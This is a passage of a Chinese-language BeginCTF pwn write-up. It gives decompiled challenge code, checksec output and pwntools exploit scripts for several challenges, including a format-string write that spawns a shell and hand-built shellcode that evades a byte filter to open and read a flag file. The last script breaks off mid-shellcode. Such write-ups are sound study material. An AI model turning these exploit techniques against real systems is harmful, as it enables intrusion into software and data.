<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"101.32.220.189"</span>, <span class="number">30510</span>)</span><br><span class="line"><span class="comment"># p = process("./ezpwn")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># .text:00000000000018B6</span></span><br><span class="line"><span class="comment"># .text:0000000000001849</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b"1"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x220</span>+<span class="number">8</span>) + <span class="built_in">chr</span>(<span class="number">0x51</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b"4"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="no_money">4 no_money</h3>
<p>检查文件：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wingee<span class="keyword">@LAPTOP-</span><span class="number">1</span><span class="attribute">THOKMAC</span>:~/Pwn&amp;Reverse/Begin/no_money$ checksec no_money</span><br><span class="line">[*] <span class="string">'/home/wingee/Pwn&amp;Reverse/Begin/no_money/no_money'</span></span><br><span class="line">    <span class="attribute">Arch</span>:     amd64-<span class="number">64</span>-little</span><br><span class="line">    <span class="attribute">RELRO</span>:    Full RELRO</span><br><span class="line">    <span class="attribute">Stack</span>:    No canary found</span><br><span class="line">    <span class="attribute">NX</span>:       NX enabled</span><br><span class="line">    <span class="attribute">PIE</span>:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>扔进IDA，发现是格式化字符串的漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">72</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to beginCTF again!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I'm sorry to tell you that We don't have the funds."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"So I will not give you $."</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your payload:"</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( buf[i] == <span class="string">'$'</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    check_target();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check_target</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = target;</span><br><span class="line">  <span class="keyword">if</span> ( target )</span><br><span class="line">    result = system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>但是它禁用了"<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="52.489ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 23200 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mo"><g data-c="2033"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z" transform="translate(275,0)"/></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(550,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">。</text></g></g><g data-mml-node="mi" transform="translate(1550,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g><g data-mml-node="mi" transform="translate(2016,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(2894,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(3772,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(4650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">也</text></g><g data-mml-node="mi" transform="translate(5650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">没</text></g><g data-mml-node="mi" transform="translate(6650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">关</text></g><g data-mml-node="mi" transform="translate(7650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">系</text></g><g data-mml-node="mi" transform="translate(8650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">吧</text></g><g data-mml-node="mi" transform="translate(9650,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(10650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">我</text></g><g data-mml-node="mi" transform="translate(11650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">们</text></g><g data-mml-node="mi" transform="translate(12650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">在</text></g><g data-mml-node="mi" transform="translate(13650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">格</text></g><g data-mml-node="mi" transform="translate(14650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">式</text></g><g data-mml-node="mi" transform="translate(15650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">化</text></g><g data-mml-node="mi" transform="translate(16650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">字</text></g><g data-mml-node="mi" transform="translate(17650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">符</text></g><g data-mml-node="mi" transform="translate(18650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">串</text></g><g data-mml-node="mi" transform="translate(19650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">中</text></g><g data-mml-node="mi" transform="translate(20650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">利</text></g><g data-mml-node="mi" transform="translate(21650,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">用</text></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(22650,0)"><g data-mml-node="mo"><g data-c="2033"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z" transform="translate(275,0)"/></g></g></g></g></g></svg></mjx-container>",大多情况下为了更加便捷地利用printf函数输出栈上指定位置的数据，如果被禁用了的话那就只能利用<code>%p-%p-%p-....</code>，再根据需要一个个查数了。</p>
<p><strong>总之，我们如果想利用<code>%n</code>向指定地址写入数据的话，必须保证printf在格式化字符串<code>%n</code>时，地址在栈顶。</strong></p>
<p>我们知道target是一个全局变量，那么只需要在栈上泄露出非libc段的地址，就能利用格式化字符串漏洞，向<code>target</code>写入数据，进而获取shell。</p>
<p>利用gdb调试程序，发现栈上存在main函数的地址：</p>
<p><img src="/2024/02/06/2023-BeginCTF-Pwn/image-20240206165300181.png"></p>
<p>之后通过无数次的尝试发现第21个%p输出的是main函数的地址</p>
<p><img src="/2024/02/06/2023-BeginCTF-Pwn/image-20240206165509326.png"></p>
<p>通过main函数的地址间接得到target的地址，进而完成写入</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./no_money'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b'Your payload:'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"%p"</span>*<span class="number">20</span> + <span class="string">b"T"</span> + <span class="string">b"%p-"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b"T"</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="built_in">eval</span>(p.recvuntil(<span class="string">b'-'</span>)[:-<span class="number">1</span>]) - <span class="number">0x1277</span> + <span class="number">0x404c</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(target))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"%p"</span>*<span class="number">9</span> + <span class="string">b"%6c%hn"</span> + p64(target)</span><br><span class="line"><span class="comment"># 为保证格式化时，target位于栈顶</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="unhappy">5 unhappy</h3>
<p>感觉他们做的都好轻松....不是哥们汇编都的这么好吗？？？</p>
<p>检查文件：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wingee<span class="keyword">@LAPTOP-</span><span class="number">1</span><span class="attribute">THOKMAC</span>:~/Pwn&amp;Reverse/Begin/happy$ checksec unhappy</span><br><span class="line">[*] <span class="string">'/home/wingee/Pwn&amp;Reverse/Begin/happy/unhappy'</span></span><br><span class="line">    <span class="attribute">Arch</span>:     amd64-<span class="number">64</span>-little</span><br><span class="line">    <span class="attribute">RELRO</span>:    Full RELRO</span><br><span class="line">    <span class="attribute">Stack</span>:    No canary found</span><br><span class="line">    <span class="attribute">NX</span>:       NX enabled</span><br><span class="line">    <span class="attribute">PIE</span>:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>扔进IDA，发现是一道shellcode题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *addr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  addr = mmap((<span class="type">void</span> *)<span class="number">0xFFF00000</span>LL, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == (<span class="type">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  {</span><br><span class="line">    perror(<span class="string">"mmap failed"</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    read(<span class="number">0</span>, addr, <span class="number">0x100</span>uLL);</span><br><span class="line">    check((__int64)addr);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))addr)();</span><br><span class="line">    <span class="keyword">if</span> ( munmap(addr, <span class="number">0x1000</span>uLL) == <span class="number">-1</span> )</span><br><span class="line">    {</span><br><span class="line">      perror(<span class="string">"munmap failed"</span>);</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">check</span><span class="params">(__int64 a1)</span></span><br><span class="line">{</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+1Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    result = *(<span class="type">unsigned</span> __int8 *)(i + a1);</span><br><span class="line">    v2 = *(_BYTE *)(i + a1);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="string">'h'</span> || v2 == <span class="number">97</span> || v2 == <span class="number">112</span> || v2 == <span class="number">121</span> || v2 == <span class="number">72</span> || v2 == <span class="number">65</span> || v2 == <span class="number">80</span> || v2 == <span class="number">89</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>大意是给一段内存空间可读可写可执行，可以输入一段shellcode但是不能包含<code>h, a, p, y, H, A, P, Y</code>中的任意字符（ASCII码值）</p>
<p>换成人话就是禁掉了大多数的<code>mov, shl, shr, inc, dec, lea...</code>，大多数的<code>sub, add, mul, div</code>，禁掉了<code>/bin/sh</code>中的<code>h</code>, <code>flag</code> 中的<code>a</code>。</p>
<p>但大多数的<code>push</code>和<code>pop</code>都可以使用（<code>push</code>一个单字节的数据可以，双字节的数据不行，<code>pop</code>同<code>push</code>）</p>
<p>既然push和pop没问题，那关键点就不在寄存器的参数传递上，而在于如何构造<code>/bin/sh</code>字符串或<code>flag</code>字符串。</p>
<ul>
<li>下面介绍<code>orw</code>的方法</li>
</ul>
<p>由于<code>inc</code>和<code>dec</code>都被禁掉，而且代码中也不允许出现直接的字符<code>h</code>和<code>a</code>，所以我们可以自己构造一段生成指定字符并保存的代码。</p>
<p>之后惊奇地发现他娘的<code>stosb</code>和<code>lodsb</code>两条指令没有被禁掉。</p>
<blockquote>
<p><code>stosb</code>表示将<code>rax</code>中的值存储到<code>rdi</code>所指向的地址中，并执行<code>inc rdi</code></p>
<p><code>lodsb</code>表示将<code>rsi</code>所指向的单字节字符存储到<code>rax</code>中，并执行<code>inc rsi</code></p>
</blockquote>
<p>所以我们可以利用<code>rdi</code>或者<code>rsi</code>的自增，去探测字符<code>a</code></p>
<p>但我们不能像这样直接比较：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp dl, 0x61 ; 'h'</span><br><span class="line">je finish</span><br></pre></td></tr></table></figure>
<p>因为这里的<code>0x61</code>直接编译到shellcode里就是一个裸的字符<code>h</code>，肯定过不了check，所以这里要判断两边，而不是直接判断中间。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmp dl, 0x60</span><br><span class="line">jbe next</span><br><span class="line">cmp dl, 0x62</span><br><span class="line">jae next</span><br><span class="line">jmp finish</span><br></pre></td></tr></table></figure>
<p>具体实现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">first:</span><br><span class="line">    cmp dl, 0x60</span><br><span class="line">    jbe next</span><br><span class="line">    cmp dl, 0x62</span><br><span class="line">    jae next</span><br><span class="line">    # 判断rdi的值是不是等于'a'</span><br><span class="line">    # 如果等于就结束，不等于就继续rdi++</span><br><span class="line">finish:</span><br><span class="line">    push rsi</span><br><span class="line">    pop rdi</span><br><span class="line">    push rdx</span><br><span class="line">    pop rax</span><br><span class="line">    stosb #存入字符 'h'</span><br><span class="line">    push {} # 此处替换成字符'g'</span><br><span class="line">    pop rax</span><br><span class="line">    stosb #存入字符'g'</span><br><span class="line">    jmp syssys</span><br><span class="line">next:</span><br><span class="line">    stosb # 相当于inc rdi</span><br><span class="line">    push rdi</span><br><span class="line">    pop rdx</span><br><span class="line">    jmp first</span><br><span class="line">    </span><br><span class="line">syssys:</span><br></pre></td></tr></table></figure>
<p>EXP：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"101.32.220.189"</span>, <span class="number">30773</span>)</span><br><span class="line"><span class="comment"># p = process("./unhappy")</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"""</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push rsp   </span></span><br><span class="line"><span class="string">    pop rdi # 获取栈地址</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rbx # 栈地址备份</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    push {} </span></span><br><span class="line"><span class="string">    pop rax # 存入字符'f'</span></span><br><span class="line"><span class="string">    stosb</span></span><br><span class="line"><span class="string">    push {}</span></span><br><span class="line"><span class="string">    pop rax # 存入字符'l'</span></span><br><span class="line"><span class="string">    stosb</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    push rdi # 保存字符串末尾位置的指针</span></span><br><span class="line"><span class="string">    pop rsi # 获取字符串胡末尾位置的指针</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">first:</span></span><br><span class="line"><span class="string">    cmp dl, 0x60</span></span><br><span class="line"><span class="string">    jbe next</span></span><br><span class="line"><span class="string">    cmp dl, 0x62</span></span><br><span class="line"><span class="string">    jae next</span></span><br><span class="line"><span class="string">    # 判断rdi的值是不是等于'a'</span></span><br><span class="line"><span class="string">    # 如果等于就结束，不等于就继续rdi++</span></span><br><span class="line"><span class="string">finish:</span></span><br><span class="line"><span class="string">    push rsi</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    stosb #存入字符 'h'</span></span><br><span class="line"><span class="string">    push {} # 此处替换成字符'g'</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    stosb #存入字符'g'</span></span><br><span class="line"><span class="string">    jmp syssys</span></span><br><span class="line"><span class="string">next:</span></span><br><span class="line"><span class="string">    stosb # 相当于inc rdi</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    pop rdx # 寄存器值传递，用dl（单字节）判断</span></span><br><span class="line"><span class="string">    jmp first</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">syssys:</span></span><br><span class="line"><span class="string">    push 0x0</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    stosb # 存入字符串末尾结束符`\x00`</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rdi # 恢复rdi为字符串首地址</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    # 